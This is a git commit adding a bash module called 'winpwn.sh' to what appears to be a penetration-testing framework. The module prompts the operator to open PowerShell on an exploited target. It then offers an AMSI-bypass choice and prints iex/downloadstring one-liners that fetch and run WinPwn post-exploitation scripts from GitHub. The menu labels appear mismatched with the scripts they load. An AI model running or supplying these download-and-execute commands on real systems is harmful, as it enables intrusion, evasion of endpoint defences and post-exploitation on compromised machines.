f4fff864a02a5373efcb099a34256b5207a06d24
s1l3nt78 <s1l3n7h0s7@gmail.com>
2020-04-21 06:56:43 +0200

    6.2
    WinPwn
    PostExploitation

---
+++ modules/postex/winpwn.sh
@@ -0,0 +1,22 @@
+echo -e "${RED}"
+figlet WinPwn
+echo -e "${ORNG}"
+echo -e "${W}Once you have a shell session open on an exploited target"
+echo -e "run ${YLW}pwsh ${W}to open a powershell session"
+echo -e "Once you have powershell open, please hit enter"
+read RANDOM
+PS3='Would you like to load and run WinPwn with AMSI bypass or run WinPwn normally?'
+            options=("With Bypass" "Without Bypass")
+            select opt in "${options[@]}"
+            do
+                case $opt in
+                    "With Bypass")
+                        echo -e "${UBLUE}iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')${NC}"
+                        ;;
+
+                    "Without Bypass")
+                        echo -e "${UBLUE}iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/ObfusWinPwn.ps1')${NC}"
+                        ;;
+                esac
+            done
+        echo -e "${NC}"
